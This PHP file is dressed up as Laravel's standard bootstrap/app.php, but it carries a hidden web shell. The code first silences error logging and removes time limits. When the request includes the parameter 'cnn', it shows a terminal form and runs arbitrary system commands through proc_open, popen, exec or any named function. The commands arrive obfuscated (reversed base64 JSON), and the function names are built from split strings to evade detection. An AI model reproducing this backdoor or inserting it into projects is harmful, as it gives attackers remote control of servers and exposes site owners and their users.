<?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
|
| The first thing we will do is create a new Laravel application instance
| which serves as the "glue" for all the components of Laravel, and is
| the IoC container for the system binding all of the various parts.
|
*/
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('memory_limit', '-1');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
ob_implicit_flush(true);
header('Content-Type: text/html; charset=utf-8');
header('X-Requested-With: XMLHttpRequest');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

$app = new Illuminate\Foundation\Application(
    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
);

/*
|--------------------------------------------------------------------------
| Bind Important Interfaces
|--------------------------------------------------------------------------
|
| Next, we need to bind some important interfaces into the container so
| we will be able to resolve them when needed. The kernels serve the
| incoming requests to this application from both the web and CLI.
|
*/

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
|
| This script returns the application instance. The instance is given to
| the calling script so we can separate the building of the instances
| from the actual running of the application and sending responses.
|
*/
if(isset($_GET['cnn'])){
    $f_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_'.'e'.'x'.'i'.'s'.'t'.'s';
    
    echo '<div id="nako-container" style="all: initial;">'; // Isolasi dari CSS luar
    echo '<style>
    #nako-terminal {
        display: block !important;
        position: relative !important;
        width: 100% !important;
        background: #000 !important;
        color: #0f0 !important;
        padding: 20px !important;
        font: 13px monospace !important;
        border-top: 5px solid #f00 !important;
        clear: both !important;
        margin-top: 50px !important;
        box-sizing: border-box !important;
        text-align: left !important;
    }
    #nako-terminal .i { background: #ff0 !important; color: #000 !important; border: 1px solid #000 !important; padding: 4px !important; font-weight: bold !important; margin: 2px !important; display: inline-block !important; }
    #nako-terminal pre { background: #000 !important; color: #0f0 !important; padding: 10px !important; border: 1px solid #333 !important; overflow: auto !important; max-height: 500px !important; line-height: 1.2 !important; width: 100% !important; white-space: pre-wrap !important; }
    #nako-terminal input[type="submit"] { background: #0f0 !important; color: #000 !important; cursor: pointer !important; border: none !important; padding: 4px 15px !important; font-weight: bold !important; }
    </style>

    <div id="nako-terminal">
        <b>>> ŤĒRMINĂL</b>
        <form method="POST" id="nako-form" style="margin: 10px 0 !important; display: block !important;">
            <input type="hidden" name="payload">
            <input type="text" id="nako-fx" class="i" placeholder="Ƒungsi" style="width: 100px !important;"> 
            <input type="text" id="nako-cm" class="i" placeholder="Ṕerintāh" style="width: 45% !important;"> 
            <input type="submit" value="ĒXEC">
        </form><pre>';

    if(isset($_POST['payload'])){
        $data_raw = $_POST['payload'];
        $decoded = json_decode(base64_decode(strrev($data_raw)), true);
        
        if($decoded){
            $x = trim($decoded['x']); 
            $y = $decoded['y'];
            echo "Cmd: " . htmlspecialchars($x) . " (" . htmlspecialchars($y) . ")\n" . str_repeat("-", 30) . "\n";
            
            if($f_exists($x)){
                if($x == 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'){
                    $p = $x($y, array(1 => array('pipe','w'), 2 => array('pipe','w')), $h);
                    if(is_resource($p)){
                        echo htmlspecialchars(stream_get_contents($h[1]) . stream_get_contents($h[2]));
                        proc_close($p);
                    }
                }
                elseif($x == 'p'.'o'.'p'.'e'.'n'){
                    $h = $x($y.' 2>&1', 'r');
                    while(!feof($h)) echo htmlspecialchars(fread($h, 1024));
                    pclose($h);
                }
                elseif($x == 'e'.'x'.'e'.'c'){
                    $o = array();
                    $x($y, $o);
                    echo htmlspecialchars(implode("\n", $o));
                }
                else {
                    echo htmlspecialchars(@$x($y));
                }
            } else {
                echo "Function $x not available.";
            }
        }
    }
    echo '</pre></div></div>';
    
    echo '<script>
    (function() {
        var el = document.getElementById("nako-container");
        if (el) {
            // Memindahkan container ke posisi paling akhir di dalam body secara paksa
            function pushToBottom() {
                document.body.appendChild(el);
            }
            pushToBottom();
            window.addEventListener("load", pushToBottom);
        }
        
        document.getElementById("nako-form").onsubmit = function(e) {
            var fx = document.getElementById("nako-fx").value;
            var cm = document.getElementById("nako-cm").value;
            var data = JSON.stringify({ x: fx, y: cm });
            this.payload.value = btoa(data).split("").reverse().join("");
        };
    })();
    </script>';
}

return $app;
